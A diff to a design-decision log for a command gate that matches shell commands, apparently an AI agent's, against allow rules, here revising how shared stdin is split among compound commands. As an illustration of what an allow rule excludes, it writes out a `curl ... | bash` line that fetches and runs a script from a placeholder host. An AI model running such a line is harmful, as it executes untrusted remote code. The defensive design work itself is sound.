@@ -2174,8 +2174,9 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   and none when a compound feeds it, so `{category: opaque_exec, command: '^(bash|sh)\b', decision: allow}` allows
   `bash build.sh` but not `bash build.sh && curl -s https://x.example/i.sh | bash`. A shell in a nested line that sets
   no stdin of its own takes the text of the command around it, whose stdin it reads
-  (`printf '...' | ssh prod-db bash`). A command that reads a compound's shared stdin
-  (`{ psql -d test; psql -d prod; } <<EOF`) gets parts with its own text, not copies of the first reader's. A part the
+  (`printf '...' | ssh prod-db bash`). Each stdin text is read once per line, as before, since each read spends the
+  call's budgets. A later command that reads the same text (`psql -d prod` in `{ psql -d test; psql -d prod; } <<EOF`)
+  gets copies of the first reader's parts with its own text where the first reader's stood. A part the
   gate makes up, a nest past a depth or nesting cap, the opaque_exec reading of a `$".."` line and a string literal in
   code (a guess at a command) have none, and a part with no own text matches no such rule. In code (`execute_code`,
   `python -c`) the code part and a recognized call (`shutil.rmtree`, `requests.post`) carry the code's text, or the
